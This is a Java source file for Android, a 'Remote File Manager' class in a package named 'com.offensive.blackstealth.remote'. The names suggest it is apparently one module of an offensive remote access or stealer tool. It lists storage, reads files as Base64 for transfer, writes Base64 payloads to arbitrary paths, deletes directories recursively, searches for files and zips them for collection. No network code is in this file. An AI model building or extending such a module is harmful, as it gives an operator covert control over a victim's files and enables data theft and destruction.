package com.offensive.blackstealth.remote;

import android.util.Base64;
import android.util.Log;
import java.io.*;
import java.security.MessageDigest;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.zip.*;

/**
 * Remote File Manager
 * File operations, upload, download, search
 */
public class FileManager {
    private static final String TAG = "FileManager";
    
    private File currentDir;
    private SimpleDateFormat dateFormat;
    
    public static class FileInfo {
        public String name;
        public String path;
        public long size;
        public long modified;
        public boolean isDirectory;
        public boolean isReadable;
        public boolean isWritable;
        public String permissions;
    }
    
    public FileManager() {
        this.currentDir = new File("/sdcard");
        this.dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
    }
    
    /**
     * List directory contents
     */
    public List<FileInfo> listDirectory(String path) {
        List<FileInfo> files = new ArrayList<>();
        File dir = path != null ? new File(path) : currentDir;
        
        if (!dir.exists() || !dir.isDirectory()) {
            return files;
        }
        
        File[] contents = dir.listFiles();
        if (contents == null) return files;
        
        for (File file : contents) {
            FileInfo info = new FileInfo();
            info.name = file.getName();
            info.path = file.getAbsolutePath();
            info.size = file.length();
            info.modified = file.lastModified();
            info.isDirectory = file.isDirectory();
            info.isReadable = file.canRead();
            info.isWritable = file.canWrite();
            info.permissions = getPermissions(file);
            files.add(info);
        }
        
        // Sort: directories first, then by name
        Collections.sort(files, (a, b) -> {
            if (a.isDirectory != b.isDirectory) {
                return a.isDirectory ? -1 : 1;
            }
            return a.name.compareToIgnoreCase(b.name);
        });
        
        return files;
    }
    
    /**
     * Get directory listing as JSON
     */
    public String listDirectoryJson(String path) {
        List<FileInfo> files = listDirectory(path);
        StringBuilder sb = new StringBuilder("[");
        
        for (int i = 0; i < files.size(); i++) {
            FileInfo f = files.get(i);
            if (i > 0) sb.append(",");
            sb.append(String.format(Locale.US,
                "{\"name\":\"%s\",\"path\":\"%s\",\"size\":%d,\"modified\":%d," +
                "\"isDir\":%b,\"readable\":%b,\"writable\":%b,\"perms\":\"%s\"}",
                escapeJson(f.name), escapeJson(f.path), f.size, f.modified,
                f.isDirectory, f.isReadable, f.isWritable, f.permissions));
        }
        
        sb.append("]");
        return sb.toString();
    }
    
    /**
     * Read file contents
     */
    public byte[] readFile(String path) throws IOException {
        File file = new File(path);
        if (!file.exists() || !file.canRead()) {
            throw new IOException("Cannot read file: " + path);
        }
        
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        FileInputStream fis = new FileInputStream(file);
        byte[] buffer = new byte[4096];
        int read;
        while ((read = fis.read(buffer)) != -1) {
            baos.write(buffer, 0, read);
        }
        fis.close();
        return baos.toByteArray();
    }
    
    /**
     * Read file as Base64
     */
    public String readFileBase64(String path) throws IOException {
        return Base64.encodeToString(readFile(path), Base64.NO_WRAP);
    }
    
    /**
     * Write file
     */
    public boolean writeFile(String path, byte[] data) {
        try {
            File file = new File(path);
            file.getParentFile().mkdirs();
            FileOutputStream fos = new FileOutputStream(file);
            fos.write(data);
            fos.close();
            Log.i(TAG, "File written: " + path);
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Write failed: " + e.getMessage());
            return false;
        }
    }
    
    /**
     * Write file from Base64
     */
    public boolean writeFileBase64(String path, String base64Data) {
        return writeFile(path, Base64.decode(base64Data, Base64.NO_WRAP));
    }
    
    /**
     * Delete file or directory
     */
    public boolean delete(String path) {
        File file = new File(path);
        if (!file.exists()) return false;
        
        if (file.isDirectory()) {
            return deleteRecursive(file);
        }
        return file.delete();
    }
    
    private boolean deleteRecursive(File dir) {
        File[] files = dir.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    deleteRecursive(file);
                } else {
                    file.delete();
                }
            }
        }
        return dir.delete();
    }
    
    /**
     * Copy file
     */
    public boolean copy(String src, String dst) {
        try {
            byte[] data = readFile(src);
            return writeFile(dst, data);
        } catch (Exception e) {
            Log.e(TAG, "Copy failed: " + e.getMessage());
            return false;
        }
    }
    
    /**
     * Move file
     */
    public boolean move(String src, String dst) {
        File srcFile = new File(src);
        File dstFile = new File(dst);
        return srcFile.renameTo(dstFile);
    }
    
    /**
     * Create directory
     */
    public boolean mkdir(String path) {
        return new File(path).mkdirs();
    }
    
    /**
     * Search for files
     */
    public List<String> search(String directory, String pattern, boolean recursive) {
        List<String> results = new ArrayList<>();
        File dir = new File(directory);
        searchRecursive(dir, pattern.toLowerCase(), recursive, results);
        return results;
    }
    
    private void searchRecursive(File dir, String pattern, boolean recursive, List<String> results) {
        if (!dir.exists() || !dir.isDirectory()) return;
        
        File[] files = dir.listFiles();
        if (files == null) return;
        
        for (File file : files) {
            if (file.getName().toLowerCase().contains(pattern)) {
                results.add(file.getAbsolutePath());
            }
            
            if (recursive && file.isDirectory()) {
                searchRecursive(file, pattern, true, results);
            }
        }
    }
    
    /**
     * Get file info
     */
    public FileInfo getFileInfo(String path) {
        File file = new File(path);
        if (!file.exists()) return null;
        
        FileInfo info = new FileInfo();
        info.name = file.getName();
        info.path = file.getAbsolutePath();
        info.size = file.length();
        info.modified = file.lastModified();
        info.isDirectory = file.isDirectory();
        info.isReadable = file.canRead();
        info.isWritable = file.canWrite();
        info.permissions = getPermissions(file);
        return info;
    }
    
    /**
     * Get file hash
     */
    public String getFileHash(String path, String algorithm) {
        try {
            MessageDigest md = MessageDigest.getInstance(algorithm);
            FileInputStream fis = new FileInputStream(path);
            byte[] buffer = new byte[4096];
            int read;
            while ((read = fis.read(buffer)) != -1) {
                md.update(buffer, 0, read);
            }
            fis.close();
            
            byte[] hash = md.digest();
            StringBuilder sb = new StringBuilder();
            for (byte b : hash) {
                sb.append(String.format("%02x", b));
            }
            return sb.toString();
            
        } catch (Exception e) {
            return null;
        }
    }
    
    /**
     * Compress files to ZIP
     */
    public File compress(List<String> paths, String outputPath) {
        try {
            File outFile = new File(outputPath);
            ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(outFile));
            
            for (String path : paths) {
                File file = new File(path);
                if (file.exists()) {
                    addToZip(file, file.getName(), zos);
                }
            }
            
            zos.close();
            return outFile;
            
        } catch (Exception e) {
            Log.e(TAG, "Compress failed: " + e.getMessage());
            return null;
        }
    }
    
    private void addToZip(File file, String name, ZipOutputStream zos) throws IOException {
        if (file.isDirectory()) {
            File[] children = file.listFiles();
            if (children != null) {
                for (File child : children) {
                    addToZip(child, name + "/" + child.getName(), zos);
                }
            }
        } else {
            ZipEntry entry = new ZipEntry(name);
            zos.putNextEntry(entry);
            
            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[4096];
            int read;
            while ((read = fis.read(buffer)) != -1) {
                zos.write(buffer, 0, read);
            }
            fis.close();
            zos.closeEntry();
        }
    }
    
    /**
     * Get storage info
     */
    public String getStorageInfo() {
        File internal = android.os.Environment.getDataDirectory();
        File external = android.os.Environment.getExternalStorageDirectory();
        
        return String.format(Locale.US,
            "{\"internal\":{\"total\":%d,\"free\":%d},\"external\":{\"total\":%d,\"free\":%d}}",
            internal.getTotalSpace(), internal.getFreeSpace(),
            external.getTotalSpace(), external.getFreeSpace());
    }
    
    /**
     * Change current directory
     */
    public boolean cd(String path) {
        File dir = new File(path);
        if (dir.exists() && dir.isDirectory()) {
            currentDir = dir;
            return true;
        }
        return false;
    }
    
    public String pwd() {
        return currentDir.getAbsolutePath();
    }
    
    private String getPermissions(File file) {
        StringBuilder sb = new StringBuilder();
        sb.append(file.isDirectory() ? 'd' : '-');
        sb.append(file.canRead() ? 'r' : '-');
        sb.append(file.canWrite() ? 'w' : '-');
        sb.append(file.canExecute() ? 'x' : '-');
        return sb.toString();
    }
    
    private String escapeJson(String s) {
        return s.replace("\\", "\\\\").replace("\"", "\\\"");
    }
}
